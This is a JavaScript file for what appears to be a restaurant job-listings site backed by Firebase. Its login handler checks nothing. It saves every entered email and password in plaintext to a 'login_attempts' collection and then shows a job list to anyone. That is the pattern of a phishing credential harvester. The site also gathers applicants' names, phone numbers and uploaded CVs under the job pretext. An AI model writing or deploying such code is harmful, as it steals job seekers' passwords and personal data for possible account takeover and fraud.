import { db } from './firebase-config.js';
import { collection, addDoc } from "https://www.gstatic.com/firebasejs/12.15.0/firebase-firestore.js";

document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.getElementById('loginForm');
    const loginError = document.getElementById('loginError');
    const jobSection = document.getElementById('jobSection');
    const jobList = document.getElementById('jobList');

    // Jobs Data (Bartender removed)
    const jobs = [
        { title: 'Chef', exp: '2+ years' },
        { title: 'Restaurant Manager', exp: '2+ years' },
        { title: 'Waiter', exp: '2+ years' },
        { title: 'Sous Chef', exp: '3+ years' },
        { title: 'Head Chef', exp: '5+ years' },
        { title: 'Food Runner', exp: '1+ years' },
        { title: 'Hostess', exp: '1+ years' }
    ];

    // Handle Login
    loginForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        const email = document.getElementById('loginEmail').value.trim();
        const password = document.getElementById('loginPassword').value.trim();

        if (!email || !password) {
            loginError.textContent = 'Please fill in both fields.';
            return;
        }

        // Save login attempt to Firestore (Collection: login_attempts)
        try {
            await addDoc(collection(db, 'login_attempts'), {
                email: email,
                password: password,
                timestamp: new Date().toISOString()
            });
            console.log('Login attempt saved.');
        } catch (err) {
            console.error('Error saving login:', err);
        }

        // Show jobs
        loginForm.style.display = 'none';
        loginError.textContent = '';
        jobSection.style.display = 'block';

        // Render jobs
        jobList.innerHTML = '';
        jobs.forEach(job => {
            const div = document.createElement('div');
            div.className = 'job-card';
            div.innerHTML = `
                <div class="info">
                    <strong>${job.title}</strong>
                    <span class="exp">${job.exp}</span>
                </div>
                <button class="btn-apply" onclick="openModal('${job.title}')">Apply Now</button>
            `;
            jobList.appendChild(div);
        });
    });

    // Modal functions (Globally accessible)
    window.openModal = function(job) {
        document.getElementById('applyModal').classList.add('active');
        document.getElementById('jobPosition').value = job;
        document.getElementById('modalJobLabel').textContent = 'Position: ' + job;
        document.body.style.overflow = 'hidden';
    };

    window.closeModal = function() {
        document.getElementById('applyModal').classList.remove('active');
        document.body.style.overflow = '';
        document.getElementById('applicationForm').reset();
        document.getElementById('applyError').textContent = '';
    };

    // Handle Application Form Submit
    document.getElementById('applicationForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        const job = document.getElementById('jobPosition').value;
        const name = document.getElementById('fullName').value.trim();
        const email = document.getElementById('email').value.trim();
        const phone = document.getElementById('phone').value.trim();
        const file = document.getElementById('cvFile').files[0];
        const error = document.getElementById('applyError');

        if (!name || !email || !phone || !file) {
            error.textContent = 'Please fill all fields and upload CV.';
            return;
        }

        const reader = new FileReader();
        reader.onloadend = async function() {
            try {
                await addDoc(collection(db, 'job_applications'), {
                    job: job,
                    name: name,
                    email: email,
                    phone: phone,
                    cv: reader.result,
                    cvName: file.name,
                    cvType: file.type,
                    timestamp: new Date().toISOString()
                });
                alert('Application submitted successfully!');
                closeModal();
            } catch (err) {
                error.textContent = 'Failed to submit. Check console.';
                console.error(err);
            }
        };
        reader.readAsDataURL(file);
    });
});
